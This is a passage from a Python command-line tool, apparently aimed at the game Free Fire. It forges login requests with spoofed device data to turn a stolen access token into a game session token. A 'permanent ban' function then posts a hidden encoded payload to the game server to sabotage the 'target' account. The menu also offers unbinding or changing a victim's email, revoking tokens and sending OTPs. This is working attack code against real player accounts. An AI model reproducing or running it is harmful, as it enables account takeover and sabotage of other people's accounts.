            result_data["result"] = func()
        except Exception as e:
            result_data["error"] = e
    t = threading.Thread(target=worker)
    t.start()
    spinner = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    bar_length = 20
    print()
    i = 0.0
    spin_idx = 0
    pad_text = text.ljust(14)
    while t.is_alive():
        percent = min(99, int(i))
        spin = spinner[spin_idx % len(spinner)]
        filled = int(bar_length * percent / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f"\r {C}[{spin}] {W}{pad_text}: {C}[{W}{bar}{C}] {G}{percent:>2}%{S}")
        sys.stdout.flush()
        time.sleep(0.05)
        spin_idx += 1
        if i < 99:
            i += 1.5
    filled = bar_length
    bar = '█' * filled
    sys.stdout.write(f"\r {C}[✔] {W}{pad_text}: {C}[{W}{bar}{C}] {G}100%{S}")
    sys.stdout.flush()
    print("\n")
    if result_data["error"]:
        raise result_data["error"]
    return result_data["result"]

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
        oId = r.get("open_id")
    except: pass
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except: pass
    if not oId:
        return None, "Failed to extract Open ID"
    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue
    return None, "MajorLogin failed"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

def show_ban_banner():
    clear()
    print(f"""
{R}╔══════════════════════════════════════════════════════╗
║                                                      ║
║            {Y}🎯 {R}██████╗  █████╗ ███╗   ██╗{Y} 🎯            ║
║            {R}██╔══██╗██╔══██╗████╗  ██║                    ║
║            {R}██████╔╝███████║██╔██╗ ██║                    ║
║            {R}██╔══██╗██╔══██║██║╚██╗██║                    ║
║            {R}██████╔╝██║  ██║██║ ╚████║                    ║
║            {R}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
║                                                      ║
║              {Y}🎯 100% PERMANENTLY BANNED {R}🎯              ║
║              {P}🔥 RAIZZ EDITION {R}🔥                      ║
║                                                      ║
╚══════════════════════════════════════════════════════╝{S}
    """)

def ff_ban():
    clear()
    banner()
    print(f"{BB}💀 FF PERMANENT BAN{S}")
    hr()
    print(f"{W}[#] Enter Valid Access Token / JWT.{S}")
    print(f"{W}[#] Type 'Q' to exit.{S}\n")
    
    access_token = input(f"{Y}> Enter Token: {W}").strip()
    
    if access_token.upper() == 'Q' or access_token.upper() == 'EXIT':
        return
    
    if not access_token:
        print(f"{R}[!] Token cannot be empty.{S}")
        input(f"{Y}Press Enter to continue...{S}")
        return
    
    try:
        def do_auth():
            return fetch_majorlogin_jwt(access_token)
        jwt_token, error_msg = run_with_loader(do_auth, "AUTHENTICATING")
        if not jwt_token:
            print(f"{R}[!] Authentication Failed: {error_msg}{S}")
            input(f"{Y}Press Enter to continue...{S}")
            return
        
        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        print(f"\n{G}[✓] Token Validated | Target Acquired{S}")
        hr()
        print(f"{C}●{W} Nickname   : {G}{nickname}{S}")
        print(f"{C}●{W} Account ID : {G}{account_id}{S}")
        print(f"{C}●{W} Region     : {G}{region}{S}")
        print(f"{C}●{W} Patch Ver  : {G}{version}{S}")
        hr()
        
        def do_inject():
            return trigger_injection(jwt_token, version)
        ban_resp = run_with_loader(do_inject, "INJECTING API")
        
        if ban_resp.status_code == 200:
            show_ban_banner()
            print(f"\n{G}[✓] Account Data Injected Successfully{S}")
            hr()
            print(f"{C}●{W} Target Name  : {G}{nickname}{S}")
            print(f"{C}●{W} Target UID   : {G}{account_id}{S}")
            print(f"{C}●{W} Target Region: {G}{region}{S}")
            print(f"{C}●{W} Patch Ver    : {G}{version}{S}")
            print(f"{C}●{W} Status       : {R}💀 PERMANENTLY BANNED 100% 💀{S}")
            print(f"{C}●{W} Edition      : {Y}🔥  RAIZZ EDITION 🔥{S}")
            hr()
            show_credits()
            print(f"\n{G}Operation Completed Successfully!{S}")
        else:
            print(f"\n{R}[✗] Failed to Execute Payload!{S}")
            print(f"{R}Server returned: {ban_resp.status_code}{S}")
        
    except Exception as e:
        print(f"\n{R}[!] Error: {str(e)}{S}")
    
    input(f"\n{Y}Press Enter to continue...{S}")

# ========== MAIN MENU ==========
def MenU():
    while True:
        banner()
        print_menu()
        sH = input(f"{BY}\nChoose{S}{W}: {S}")
        
        if sH == '1':
            clear()
            SEnd(input(f"{B}📧 {W}Enter Email{S}{W}: {S}"), input(f"{B}🔑 {W}Enter Access{S}{W}: {S}"))
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '2':
            clear()
            ChK(input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}"))
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '3':
            clear()
            GeT_PLaFTroms(input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}"))
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '4':
            clear()
            CancEL(input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}"))
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '5':
            clear()
            unbind_email()
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '6':
            clear()
            change_bind_email()
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '7':
            clear()
            ReVoKe(input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}"))
            input(f"\n{Y}Press Enter to return menu...{S}")
        elif sH == '8':
            ff_ban()
        elif sH == '9':
            resubscribe_otp_sender()
        elif sH == '10':
            ban_check()
        elif sH == '0':
            print(f"\n{BR}Exiting... Goodbye love you 💖👋{S}")
            sys.exit(0)
        else:
            print(f"{R}No Choosing !{S}")
            input(f"{Y}Press Enter...{S}")

if __name__ == '__main__':
    try:
        MenU()
    except KeyboardInterrupt:
        print(f"\n\n{R}Session interrupted.{S}")
        sys.exit(0)
